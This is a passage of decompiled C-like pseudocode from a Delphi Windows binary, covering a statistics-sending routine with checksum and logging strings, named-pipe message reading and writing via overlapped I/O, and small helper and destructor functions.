  unsigned __int64 v1; // rax
  unsigned __int64 v2; // rax

  LODWORD(v1) = (*(int (__fastcall **)(_QWORD *))(*(_DWORD *)a1 + 20))(a1);
  if ( v1 <= a1[5] )
  {
    a1[5] *= 2i64;
    LODWORD(v2) = (*(int (__fastcall **)(_QWORD *))(*(_DWORD *)a1 + 24))(a1);
    if ( v2 < a1[5] )
    {
      v2 = ((__int64 (*)(void))*(_DWORD *)(*(_DWORD *)a1 + 24))();
      a1[5] = v2;
    }
  }
  else
  {
    v2 = ((__int64 (*)(void))*(_DWORD *)(*(_DWORD *)a1 + 20))();
    a1[5] = v2;
  }
  return v2;
}
// 452E1A: variable 'v1' is possibly undefined
// 452E55: variable 'v2' is possibly undefined

//----- (00452E90) --------------------------------------------------------
int __usercall sub_452E90@<eax>(int *a1@<eax>, char a2@<dl>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  __int64 v5; // rax
  bool v6; // cf
  signed int v7; // eax
  signed int v8; // eax
  int v9; // ebx
  int v10; // ebx
  int v11; // eax
  bool v12; // cc
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // ebx
  int v19; // eax
  unsigned int v21; // [esp-3Ch] [ebp-A4h]
  int v22; // [esp-38h] [ebp-A0h]
  int v23; // [esp-38h] [ebp-A0h]
  struct _EXCEPTION_REGISTRATION_RECORD *v24; // [esp-34h] [ebp-9Ch] BYREF
  const char *v25; // [esp-30h] [ebp-98h]
  const wchar_t *v26; // [esp-2Ch] [ebp-94h]
  int v27; // [esp-28h] [ebp-90h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-24h] [ebp-8Ch] BYREF
  void *v29; // [esp-20h] [ebp-88h]
  int *v30; // [esp-1Ch] [ebp-84h]
  _DWORD v31[3]; // [esp-18h] [ebp-80h] BYREF
  unsigned int v32[2]; // [esp-Ch] [ebp-74h] BYREF
  int *v33; // [esp-4h] [ebp-6Ch]
  unsigned int v34; // [esp+4h] [ebp-64h] BYREF
  DWORD cchLength; // [esp+8h] [ebp-60h] BYREF
  const WCHAR *v36; // [esp+Ch] [ebp-5Ch] BYREF
  CHAR *v37; // [esp+10h] [ebp-58h] BYREF
  void *v38; // [esp+14h] [ebp-54h] BYREF
  int v39; // [esp+18h] [ebp-50h] BYREF
  const char *v40; // [esp+1Ch] [ebp-4Ch] BYREF
  int v41; // [esp+20h] [ebp-48h] BYREF
  int v42; // [esp+24h] [ebp-44h] BYREF
  __int64 v43; // [esp+28h] [ebp-40h] BYREF
  int v44; // [esp+30h] [ebp-38h] BYREF
  int v45; // [esp+34h] [ebp-34h] BYREF
  int i; // [esp+38h] [ebp-30h]
  int v47; // [esp+3Ch] [ebp-2Ch]
  _DWORD *v48; // [esp+40h] [ebp-28h]
  struct _EXCEPTION_REGISTRATION_RECORD *v49; // [esp+44h] [ebp-24h] BYREF
  int v50; // [esp+48h] [ebp-20h]
  int v51; // [esp+4Ch] [ebp-1Ch] BYREF
  int *v52; // [esp+50h] [ebp-18h]
  int v53; // [esp+54h] [ebp-14h] BYREF
  _DWORD *v54; // [esp+58h] [ebp-10h] BYREF
  int v55; // [esp+5Ch] [ebp-Ch]
  char v56; // [esp+63h] [ebp-5h]
  int *v57; // [esp+64h] [ebp-4h]
  int savedregs; // [esp+68h] [ebp+0h] BYREF

  v56 = a2;
  v57 = a1;
  v33 = &savedregs;
  v32[1] = (unsigned int)&loc_4533E8;
  v32[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v32);
  if ( !(*(unsigned __int8 (__fastcall **)(int *))(*a1 + 28))(a1) || (a3 = sub_4239B0(), a3 == sub_4239A0()) )
  {
    if ( *((_BYTE *)v57 + 4) )
    {
      if ( v56 )
      {
        sub_405514(*v57, (int)&v44);
        sub_433BE0(*off_467F18, (int)L"Force send starting", v44);
      }
      if ( v56 || !(*(unsigned __int8 (__fastcall **)(int *))(*v57 + 32))(v57) )
      {
        if ( v56 )
          goto LABEL_14;
        sub_423830(&v43);
        v5 = sub_428CA0(&v43, (_QWORD *)v57 + 7);
        v6 = 1;
        if ( v5 >= 0 )
          v6 = (unsigned __int64)v5 < *((_QWORD *)v57 + 5);
        if ( !v6 )
        {
LABEL_14:
          ++v57[9];
          v31[2] = &savedregs;
          v31[1] = &loc_453368;
          v31[0] = NtCurrentTeb()->NtTib.ExceptionList;
          __writefsdword(0, (unsigned int)v31);
          sub_4285F0((int (__fastcall ***)(_DWORD))v57[4]);
          v30 = &savedregs;
          v29 = &loc_4531A6;
          ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
          __writefsdword(0, (unsigned int)&ExceptionList);
          if ( v56 )
          {
            sub_405514(*v57, (int)&v42);
            v27 = v42;
            v26 = L"Force send GrpCount=";
            v7 = System::__linkproc__ LStrLen(v57[5]);
            sub_415150(v7, (int *)&v40);
            v25 = v40;
            v24 = (struct _EXCEPTION_REGISTRATION_RECORD *)L" NonGrpCount=";
            v8 = System::__linkproc__ LStrLen(v57[5]);
            sub_415150(v8, &v39);
            v22 = v39;
            sub_4079F0(&v41, 4);
            sub_433BE0(*off_467F18, v41, v22);
          }
          if ( System::__linkproc__ LStrLen(v57[5]) || System::__linkproc__ LStrLen(v57[6]) )
          {
            sub_452730(v57, a4, a5);
            sub_453660(v57, a3, a4, a5);
            sub_408B78(&v53, v57[5], (int)&byte_451D34);
            v9 = System::__linkproc__ LStrLen(v53);
            v10 = System::__linkproc__ LStrLen(v57[6]) + v9;
            System::__linkproc__ DynArraySetLength(v10);
            v23 = System::__linkproc__ LStrLen(v57[5]);
            v11 = sub_40867C(v53);
            v12 = v11 < v23;
            v13 = v11 - v23;
            if ( !v12 )
            {
              i = v13 + 1;
              v55 = v23;
              do
              {
                v14 = System::__linkproc__ LStrLen(v57[5]);
                System::__linkproc__ IntfCopy(v53 + 4 * v55, *(_DWORD *)(v57[6] + 4 * (v55 - v14)));
                ++v55;
                --i;
              }
              while ( i );
            }
            sub_408B34(v57 + 5, (int)&byte_451D34);
            sub_408B34(v57 + 6, (int)&byte_451D34);
            v52 = (int *)sub_405568((int)&cls_CrossPlatform_TMemoryStream, 1);
            sub_408B78(&v45, v53, (int)&byte_451D34);
            for ( i = 0; ; ++i )
            {
              v16 = System::__linkproc__ LStrLen(v45);
              if ( v16 <= i )
                break;
              System::__linkproc__ IntfCopy(&v54, *(_DWORD *)(v45 + 4 * i));
              (*(void (__fastcall **)(_DWORD *, void **))(*v54 + 28))(v54, &v38);
              sub_40732C(&v51, v38, dword_4534FC);
              System::__linkproc__ LStrLen(v51);
              v15 = sub_4071C8(&v51);
              v10 = *v52;
              (*(void (__fastcall **)(int *, int))(*v52 + 16))(v52, v15);
            }
            sub_408B34(&v45, (int)&byte_451D34);
            __writefsdword(0, (unsigned int)v24);
            v26 = (const wchar_t *)&loc_4531AD;
            sub_428600(v57[4]);
            (*(void (__fastcall **)(int *, struct _EXCEPTION_REGISTRATION_RECORD **))*v57)(v57, &v49);
            if ( (*(unsigned __int8 (__fastcall **)(int *))(*v57 + 28))(v57) )
              v48 = (_DWORD *)v57[13];
            else
              v48 = (_DWORD *)sub_438970(v10, a4, a5);
            v26 = (const wchar_t *)&savedregs;
            v25 = (const char *)&loc_453220;
            v24 = NtCurrentTeb()->NtTib.ExceptionList;
            __writefsdword(0, (unsigned int)&v24);
            v17 = (*(int (__fastcall **)(int *))*v52)(v52);
            v47 = sub_43B330((int)v48, v52[1], v17);
            __writefsdword(0, (unsigned int)v24);
            v26 = (const wchar_t *)&loc_453227;
            if ( !(*(unsigned __int8 (__fastcall **)(int *))(*v57 + 28))(v57) )
              sub_405598(v48);
            v26 = (const wchar_t *)v49;
            v25 = "&chksum=";
            sub_4154C8(1, (int *)&cchLength, (unsigned int)v47);
            sub_426A60(cchLength, (int *)&v36);
            sub_407634(&v37, v36, 0, (unsigned __int16)v25);
            v25 = v37;
            sub_4073B0((__int32 *)&v49, 3);
            if ( !v56 )
            {
              v24 = v49;
              sub_425AE0(v57[7], (int *)&v34);
              v21 = v34;
              sub_4073B0((__int32 *)&v49, 3);
            }
            v50 = sub_405568((int)&cls_StatRootUtil_TStatRootSendingInfo, 1);
            *(_DWORD *)(v50 + 4) = v52;
            sub_408B78((int *)(v50 + 8), v53, (int)&byte_451D34);
            *(_BYTE *)(v50 + 12) = v56;
            v18 = *v57;
            if ( (*(unsigned __int8 (__fastcall **)(int *, struct _EXCEPTION_REGISTRATION_RECORD *, int))(*v57 + 36))(
                   v57,
                   v49,
                   v50) )
            {
              sub_423830(&v43);
              *((_QWORD *)v57 + 7) = v43;
            }
            else
            {
              sub_408B78(&v45, v53, (int)&byte_451D34);
              for ( i = 0; ; ++i )
              {
                v19 = System::__linkproc__ LStrLen(v45);
                if ( v19 <= i )
                  break;
                System::__linkproc__ IntfCopy(&v54, *(_DWORD *)(v45 + 4 * i));
                sub_452920(v57, v54, v18, a4, a5);
              }
              sub_408B34(&v45, (int)&byte_451D34);
              sub_452E00(v57);
            }
            __writefsdword(0, v21);
            v24 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_45336F;
            --v57[9];
          }
          else
          {
            System::__linkproc__ TryFinallyExit(v24, v25, v26);
            System::__linkproc__ TryFinallyExit(v27, ExceptionList, v29);
          }
        }
      }
    }
  }
  else if ( !*((_BYTE *)v57 + 32) )
  {
    *((_BYTE *)v57 + 32) = 1;
    sub_4338D0(*off_467F18, (unsigned int)L"TStatRootSender.Process from non-main thread", 0, a3, a4, a5);
  }
  __writefsdword(0, v32[0]);
  v33 = (int *)&loc_4533EF;
  sub_406C68(&v34);
  sub_406CA4((int)&cchLength, 2);
  sub_406CD4((int)&v37, 2);
  sub_406CA4((int)&v39, 4);
  sub_406C44(&v44);
  sub_408B34(&v45, (int)&byte_451D34);
  sub_406C68(&v49);
  sub_406C68(&v51);
  sub_408B34(&v53, (int)&byte_451D34);
  return System::__linkproc__ IntfClear(&v54);
}
// 453359: variable 'v21' is possibly undefined
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 407104: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);
// 408670: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 40A04C: using guessed type int __fastcall System::__linkproc__ IntfClear(_DWORD);
// 40A064: using guessed type int __fastcall System::__linkproc__ IntfCopy(_DWORD, _DWORD);
// 4227A8: using guessed type int (*cls_CrossPlatform_TMemoryStream)();
// 451D34: using guessed type char byte_451D34;
// 452058: using guessed type __int16 cls_StatRootUtil_TStatRootSendingInfo;
// 453400: using guessed type wchar_t aTstatrootsende[45];
// 453468: using guessed type wchar_t aForceSendStart[20];
// 45349C: using guessed type wchar_t aForceSendGrpco[21];
// 4534D4: using guessed type wchar_t aNongrpcount[14];
// 4534FC: using guessed type int dword_4534FC[4];
// 467F18: using guessed type int *off_467F18;

//----- (00453530) --------------------------------------------------------
int __userpurge sub_453530@<eax>(int *a1@<eax>, int a2@<edx>, __int32 a3@<ecx>, int a4@<edi>, int a5@<esi>, int a6)
{
  bool v6; // al
  __int64 v7; // rax
  int v8; // eax
  unsigned int v10[2]; // [esp-Ch] [ebp-2Ch] BYREF
  int *v11; // [esp-4h] [ebp-24h]
  int v12; // [esp+4h] [ebp-1Ch] BYREF
  int i; // [esp+8h] [ebp-18h]
  bool v14; // [esp+Fh] [ebp-11h]
  _DWORD *v15; // [esp+10h] [ebp-10h] BYREF
  __int32 v16; // [esp+14h] [ebp-Ch]
  int v17; // [esp+18h] [ebp-8h]
  int *v18; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v15 = 0;
  v12 = 0;
  v16 = a3;
  v17 = a2;
  v18 = a1;
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_453645;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  a1[2] = a2;
  sub_407084(v18 + 3, v16);
  v6 = v17 >= 200 && v17 < 400;
  v14 = v6;
  if ( v6 )
  {
    v7 = ((__int64 (__fastcall *)(int *))*(_DWORD *)(*v18 + 20))(v18);
    *((_QWORD *)v18 + 5) = v7;
    if ( !*(_BYTE *)(a6 + 12) )
      ++v18[7];
  }
  else
  {
    sub_408B78(&v12, *(_DWORD *)(a6 + 8), (int)&byte_451D34);
    for ( i = 0; ; ++i )
    {
      v8 = System::__linkproc__ LStrLen(v12);
      if ( v8 <= i )
        break;
      System::__linkproc__ IntfCopy(&v15, *(_DWORD *)(v12 + 4 * i));
      if ( ((*(int (__fastcall **)(_DWORD *))(*v15 + 20))(v15) & 1) == 0 )
        sub_452920(v18, v15, 0, a4, a5);
    }
    sub_408B34(&v12, (int)&byte_451D34);
    sub_452E00(v18);
  }
  sub_405598((_DWORD *)a6);
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_45364C;
  sub_408B34(&v12, (int)&byte_451D34);
  return System::__linkproc__ IntfClear(&v15);
}
// 408670: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 40A04C: using guessed type int __fastcall System::__linkproc__ IntfClear(_DWORD);
// 40A064: using guessed type int __fastcall System::__linkproc__ IntfCopy(_DWORD, _DWORD);
// 451D34: using guessed type char byte_451D34;

//----- (00453660) --------------------------------------------------------
int __usercall sub_453660@<eax>(int *a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>)
{
  _DWORD *v4; // eax
  _DWORD *v5; // edx
  unsigned int v7; // [esp-20h] [ebp-30h]
  _DWORD v8[3]; // [esp-Ch] [ebp-1Ch] BYREF
  unsigned int v9; // [esp+0h] [ebp-10h] BYREF
  int v10; // [esp+4h] [ebp-Ch] BYREF
  __int32 v11; // [esp+8h] [ebp-8h] BYREF
  int *v12; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v10 = 0;
  v9 = 0;
  v12 = a1;
  v8[2] = &savedregs;
  v8[1] = &loc_453716;
  v8[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  sub_425AE0(a1[2], &v10);
  sub_452B60(*v12, v12[3], (int)&v9);
  v7 = v9;
  sub_4073B0(&v11, 5);
  v4 = (_DWORD *)sub_4538E0(1, v11);
  v5 = v4;
  if ( v4 )
    v5 = v4 + 5;
  sub_452920(v12, v5, a2, a3, a4);
  v12[2] = -2;
  sub_406C68(v12 + 3);
  __writefsdword(0, v7);
  return sub_406CD4((int)&v9, 3);
}
// 4538E0: using guessed type _DWORD __stdcall sub_4538E0(char, _DWORD);

//----- (00453800) --------------------------------------------------------
int __fastcall sub_453800(int a1, signed int *a2, int *a3)
{
  return sub_451A90(a2, a3);
}

//----- (00453820) --------------------------------------------------------
int sub_453820()
{
  __int64 v0; // rax
  int result; // eax
  char v2; // [esp+3h] [ebp-5h]
  int v3; // [esp+4h] [ebp-4h]

  v0 = System::__linkproc__ BeforeDestruction();
  v2 = BYTE4(v0);
  v3 = v0;
  unknown_libname_94(v0 + 4);
  result = sub_405588();
  if ( v2 > 0 )
    return System::__linkproc__ ClassDestroy(v3);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 41C304: using guessed type int __fastcall unknown_libname_94(_DWORD);

//----- (00453A10) --------------------------------------------------------
char __fastcall sub_453A10(int a1)
{
  return *(_BYTE *)(a1 + 16);
}

//----- (00454460) --------------------------------------------------------
void __stdcall sub_454460(DWORD dwErrorCode, DWORD dwNumberOfBytesTransfered, LPOVERLAPPED lpOverlapped)
{
  ULONG_PTR Internal; // ebx
  char v4; // al

  Internal = lpOverlapped[1].Internal;
  *(_BYTE *)(Internal + 5) = 0;
  v4 = 0;
  if ( !dwErrorCode )
    v4 = sub_454A80(Internal);
  if ( !v4 )
    (**(void (__fastcall ***)(ULONG_PTR))Internal)(Internal);
}
// 454A80: using guessed type int __fastcall sub_454A80(_DWORD);

//----- (00454490) --------------------------------------------------------
void __stdcall CompletionRoutine(DWORD dwErrorCode, DWORD dwNumberOfBytesTransfered, LPOVERLAPPED lpOverlapped)
{
  int Internal; // ebx
  bool v4; // al

  Internal = lpOverlapped[1].Internal;
  *(_BYTE *)(Internal + 4) = 0;
  v4 = 0;
  if ( !dwErrorCode )
    v4 = sub_454790(Internal, dwNumberOfBytesTransfered);
  if ( !v4 )
    (**(void (__fastcall ***)(int))Internal)(Internal);
}

//----- (004544C0) --------------------------------------------------------
volatile __int32 *__fastcall sub_4544C0(_DWORD *a1, volatile __int32 *a2)
{
  return sub_407968(a2, L"\\\\.\\pipe\\", a1);
}
// 4544E8: using guessed type wchar_t aPipe[10];

//----- (00454500) --------------------------------------------------------
int __fastcall sub_454500(Ibservices::TLicenseMaskInfo *this)
{
  Ibservices::TLicenseMaskInfo::Clear(this);
  sub_4051B8((_WORD *)this + 6, 4, 0);
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 5) = 0;
  return System::__linkproc__ IntfClear((char *)this + 24);
}
// 40A04C: using guessed type int __fastcall System::__linkproc__ IntfClear(_DWORD);

//----- (00454540) --------------------------------------------------------
int __fastcall sub_454540(int result, char a2, __int16 a3)
{
  *(_BYTE *)(result + 12) = 2;
  *(_BYTE *)(result + 13) = a2;
  *(_WORD *)(result + 14) = a3;
  return result;
}

//----- (00454550) --------------------------------------------------------
void __fastcall sub_454550(int a1)
{
  CompletionRoutine(0, 0, (LPOVERLAPPED)(a1 + 44));
}

//----- (00454570) --------------------------------------------------------
int __fastcall sub_454570(int a1, char a2, int a3, int a4)
{
  int v4; // esi
  char v5; // bl
  int v6; // edi

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v4 = a3;
  v5 = a2;
  v6 = a1;
  *(_DWORD *)(a1 + 104) = a4;
  sub_4051B8((_WORD *)(a1 + 112), 20, 0);
  *(_DWORD *)(v6 + 8) = sub_428A10((int)&cls_CrossPlatform_TFIFOContainer, 1, (int)&off_454328, 100000);
  sub_4075BC((_DWORD *)(v6 + 12), v4, 0);
  *(_DWORD *)(v6 + 40) = v4;
  *(_DWORD *)(v6 + 32) = sub_4071C8(v6 + 12);
  *(_DWORD *)(v6 + 36) = sub_4071C8(v6 + 12) + 4;
  sub_4075BC((_DWORD *)(v6 + 16), v4, 0);
  *(_DWORD *)(v6 + 28) = v4;
  *(_DWORD *)(v6 + 20) = sub_4071C8(v6 + 16);
  *(_DWORD *)(v6 + 24) = sub_4071C8(v6 + 16) + 4;
  sub_4051B8((_WORD *)(v6 + 44), 24, 0);
  sub_4051B8((_WORD *)(v6 + 68), 24, 0);
  *(_DWORD *)(v6 + 64) = v6;
  *(_DWORD *)(v6 + 88) = v6;
  if ( v5 )
    System::__linkproc__ AfterConstruction(v6);
  return v6;
}
// 454585: variable 'a3' is possibly undefined
// 454587: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);
// 4234D4: using guessed type __int16 cls_CrossPlatform_TFIFOContainer;
// 454328: using guessed type int (__fastcall *off_454328)(Ibservices::TLicenseMaskInfo *this);

//----- (00454660) --------------------------------------------------------
_DWORD *sub_454660()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  _DWORD *v3; // eax
  _DWORD *result; // eax

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  sub_405588();
  v3 = *(_DWORD **)(v2 + 8);
  *(_DWORD *)(v2 + 8) = 0;
  result = sub_405598(v3);
  if ( v1 > 0 )
    return (_DWORD *)System::__linkproc__ ClassDestroy(v2);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (00454790) --------------------------------------------------------
BOOL __fastcall sub_454790(int a1, unsigned int a2)
{
  int v3; // ebx
  unsigned __int16 v4; // ax
  char v5; // dl
  bool v6; // cf
  unsigned __int8 v7; // dl
  _DWORD *v8; // eax
  int v9; // eax
  int v10; // edx
  int v11; // eax
  int v12; // edi
  int v13; // eax
  unsigned __int16 v14; // ax
  char v15; // al
  char v16; // bl
  void *v17; // eax
  int v18; // eax
  int v19; // edx
  int v20; // eax
  int v21; // eax
  BOOL File; // eax
  BOOL v23; // ebx
  int v25; // [esp-10h] [ebp-24h]
  unsigned int v26[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v27; // [esp-4h] [ebp-18h]
  int v28; // [esp+Ch] [ebp-8h]
  int v29; // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v29 = 0;
  v27 = &savedregs;
  v26[1] = (unsigned int)&loc_45496E;
  v26[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v26);
  if ( a2 >= 4 )
  {
    v3 = *(_DWORD *)(a1 + 32);
    if ( *(_BYTE *)v3 == 2 )
    {
      v4 = *(_WORD *)(v3 + 2);
      if ( a2 == v4 + 4 )
      {
        v5 = *(_BYTE *)(v3 + 1);
        v6 = v5 == 0;
        v7 = v5 - 1;
        if ( v6 )
        {
          if ( v4 == 20 )
          {
            v8 = *(_DWORD **)(a1 + 36);
            *(_DWORD *)(a1 + 112) = *v8;
            *(_DWORD *)(a1 + 116) = v8[1];
            *(_DWORD *)(a1 + 120) = v8[2];
            *(_DWORD *)(a1 + 124) = v8[3];
            *(_DWORD *)(a1 + 128) = v8[4];
            v9 = sub_405568((int)&cls_InterComUtil_TICMessageZeroData, 1);
            v10 = v9;
            if ( v9 )
              v10 = v9 + 12;
            System::__linkproc__ IntfCopy(&v29, v10);
            v11 = sub_454C40((int)&cls_InterComUtil_TICMessage, 1, 0, (_DWORD *)(a1 + 112), v29, 0, 0, 0);
            (*(void (__fastcall **)(int, int))(*(_DWORD *)a1 + 4))(a1, v11);
          }
        }
        else if ( v7 < 4u )
        {
          v28 = *(_DWORD *)(a1 + 100);
          v12 = v28 + v4;
          v13 = *(_DWORD *)(a1 + 92);
          if ( v13 )
            v13 = *(_DWORD *)(v13 - 4);
          if ( v12 > v13 )
          {
            sub_4075BC((_DWORD *)(a1 + 92), v12, 0);
            *(_DWORD *)(a1 + 96) = sub_4071C8(a1 + 92);
          }
          *(_DWORD *)(a1 + 100) = v12;
          v14 = *(_WORD *)(v3 + 2);
          if ( v14 )
            System::Move(*(const void **)(a1 + 36), (void *)(v28 + *(_DWORD *)(a1 + 96)), v14);
          v15 = *(_BYTE *)(v3 + 1);
          if ( v15 == 2 || v15 == 4 )
          {
            if ( v15 == 2 )
              v16 = 3;
            else
              v16 = 2;
            if ( *(int *)(a1 + 100) <= 0 )
            {
              v20 = sub_405568((int)&cls_InterComUtil_TICMessageZeroData, 1);
              v19 = v20;
              if ( v20 )
                v19 = v20 + 12;
            }
            else
            {
              v25 = *(_DWORD *)(a1 + 100);
              v17 = (void *)sub_4071C8(a1 + 92);
              v18 = sub_454E20((int)&cls_InterComUtil_TICMessageAlignMemData, 1, v17, v25);
              v19 = v18;
              if ( v18 )
                v19 = v18 + 24;
            }
            System::__linkproc__ IntfCopy(&v29, v19);
            v21 = sub_454C40((int)&cls_InterComUtil_TICMessage, 1, v16, (_DWORD *)(a1 + 112), v29, 0, 0, 0);
            *(_DWORD *)(a1 + 100) = 0;
            (*(void (__fastcall **)(int, int))(*(_DWORD *)a1 + 4))(a1, v21);
          }
        }
      }
    }
  }
  File = ReadFileEx(
           *(HANDLE *)(a1 + 108),
           *(LPVOID *)(a1 + 32),
           *(_DWORD *)(a1 + 40),
           (LPOVERLAPPED)(a1 + 44),
           CompletionRoutine);
  v23 = File;
  if ( File )
    *(_BYTE *)(a1 + 4) = 1;
  __writefsdword(0, v26[0]);
  v27 = (int *)&loc_454975;
  System::__linkproc__ IntfClear(&v29);
  return v23;
}
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);
// 40A04C: using guessed type int __fastcall System::__linkproc__ IntfClear(_DWORD);
// 40A064: using guessed type int __fastcall System::__linkproc__ IntfCopy(_DWORD, _DWORD);
// 453F78: using guessed type __int16 cls_InterComUtil_TICMessageZeroData;
// 4541C8: using guessed type __int16 cls_InterComUtil_TICMessageAlignMemData;
// 45427C: using guessed type __int16 cls_InterComUtil_TICMessage;

//----- (00454980) --------------------------------------------------------
unsigned __int8 __fastcall sub_454980(int a1, unsigned __int8 a2, int a3, int a4)
{
  int v6; // ebx
  void (__fastcall ***v7)(_DWORD); // edi
  unsigned __int8 result; // al
  char v9; // [esp+Fh] [ebp-19h]
  void (__fastcall ***v10)(_DWORD); // [esp+14h] [ebp-14h]
  unsigned __int8 v11; // [esp+1Bh] [ebp-Dh]
  int v12; // [esp+1Ch] [ebp-Ch]
  int v13; // [esp+20h] [ebp-8h]

  v13 = 0;
  v10 = sub_428AF0(*(_DWORD **)(a1 + 8));
  System::__linkproc__ IntfCopy(v10 + 6, a3);
  v12 = (*((int (__fastcall **)(_DWORD))*v10[6] + 4))(v10[6]);
  v10[4] = (void (__fastcall **)(_DWORD))a4;
  sub_454BA0(*(_DWORD *)(a1 + 104), a4);
  do
  {
    v6 = v12 - v13;
    if ( *(_DWORD *)(a1 + 28) >= v12 - v13 + 4 )
    {
      v11 = 1;
      v7 = v10;
    }
    else
    {
      v6 = *(_DWORD *)(a1 + 28) - 4;
      v11 = 0;
      v7 = sub_428AF0(*(_DWORD **)(a1 + 8));
    }
    v9 = byte_467DE0[2 * a2 + v11];
    *((_BYTE *)v7 + 12) = 2;
    *((_BYTE *)v7 + 13) = v9;
    *((_WORD *)v7 + 7) = v6;
    if ( v6 > 0 )
    {
      v7[5] = (void (__fastcall **)(_DWORD))(*((int (__fastcall **)(_DWORD))*v10[6] + 3))(v10[6]);
      v7[5] = (void (__fastcall **)(_DWORD))((char *)v7[5] + v13);
      v13 += v6;
    }
    result = (unsigned __int8)sub_428B50(*(_DWORD **)(a1 + 8), (int)v7);
  }
  while ( !v11 );
  if ( !*(_BYTE *)(a1 + 5) )
    return sub_454A80(a1);
  return result;
}
// 40A064: using guessed type int __fastcall System::__linkproc__ IntfCopy(_DWORD, _DWORD);
// 467DE0: using guessed type _BYTE byte_467DE0[4];

//----- (00454A80) --------------------------------------------------------
bool __fastcall sub_454A80(int a1)
{
  _DWORD *v1; // eax
  int v2; // edx
  int v3; // ecx
  bool result; // al
  unsigned __int16 v5; // ax
  unsigned int v6[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v7; // [esp-4h] [ebp-10h]
  DWORD nNumberOfBytesToWrite; // [esp+0h] [ebp-Ch]
  void (***v9)(void); // [esp+4h] [ebp-8h]
  int v10; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v10 = a1;
  v1 = *(_DWORD **)(a1 + 8);
  v2 = v1[1];
  if ( v2 )
  {
    v3 = *(_DWORD *)(v2 + 4);
    v1[1] = v3;
    if ( !v3 )
      v1[2] = 0;
    --v1[3];
  }
  v9 = (void (***)(void))v2;
  if ( !v2 )
    return 1;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_454B3B;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_454BF0(*(_DWORD *)(v10 + 104), (int)v9[4]);
  System::Move(v9 + 3, *(void **)(v10 + 20), 4);
  nNumberOfBytesToWrite = 4;
  v5 = *((_WORD *)v9 + 7);
  if ( v5 )
  {
    System::Move(v9[5], *(void **)(v10 + 24), v5);
    nNumberOfBytesToWrite += *((unsigned __int16 *)v9 + 7);
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_454B42;
  sub_428B20(*(_DWORD **)(v10 + 8), v9);
  result = WriteFileEx(
             *(HANDLE *)(v10 + 108),
             *(LPCVOID *)(v10 + 20),
             nNumberOfBytesToWrite,
             (LPOVERLAPPED)(v10 + 68),
             sub_454460);
  if ( result )
    *(_BYTE *)(v10 + 5) = 1;
  return result;
}

//----- (00454B80) --------------------------------------------------------
int __fastcall sub_454B80(int a1)
{
  *(_DWORD *)(a1 + 100) = 0;
  sub_428A70(*(_DWORD **)(a1 + 8));
  return sub_454BD0(*(_WORD **)(a1 + 104));
}

//----- (00454BA0) --------------------------------------------------------
int __fastcall sub_454BA0(int result, int a2)
{
  if ( a2 > 0 && a2 <= 255 )
    ++*(_DWORD *)(result + 4 * a2);
  return result;
}

//----- (00454BB0) --------------------------------------------------------
int __fastcall sub_454BB0(int a1)
{
  int result; // eax

  sub_454BD0((_WORD *)a1);
  result = 0;
  *(_DWORD *)(a1 + 1024) = 0;
  *(_DWORD *)(a1 + 1028) = 0;
  return result;
}

//----- (00454BD0) --------------------------------------------------------
int __fastcall sub_454BD0(_WORD *a1)
{
  return sub_4051B8(a1, 1024, 0);
}

//----- (00454BF0) --------------------------------------------------------
int __fastcall sub_454BF0(int result, int a2)
{
  if ( a2 > 0 && a2 <= 255 )
    --*(_DWORD *)(result + 4 * a2);
  return result;
}

//----- (00454C00) --------------------------------------------------------
char __fastcall sub_454C00(int a1, int a2)
{
  char result; // al
  int v4; // ecx

  result = 0;
  v4 = *(_DWORD *)(a2 + 32);
  if ( v4 > 0 && v4 <= 255 && *(_DWORD *)(a1 + 4 * v4) > *(_DWORD *)(a2 + 36) )
  {
    if ( *(_WORD *)(a1 + 1026) )
      (*(void (__fastcall **)(_DWORD))(a1 + 1024))(*(_DWORD *)(a1 + 1028));
    return 1;
  }
  return result;
}

